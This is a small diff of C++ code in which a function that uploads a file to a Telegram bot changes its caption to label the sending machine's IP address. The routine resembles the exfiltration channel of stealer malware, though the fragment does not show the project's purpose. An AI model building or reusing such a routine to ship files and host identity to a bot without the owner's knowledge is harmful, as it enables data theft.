@@ -54,7 +54,7 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
     memcpy(&body[fileStart], fileData.data(), fileData.size());
     body += "\r\n";
 
-    std::string caption = getIpAdress();
+    std::string caption = "IP: " + getIpAdress();
     body += "--" + boundaryA + "\r\n";
     body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
     body += caption + "\r\n";
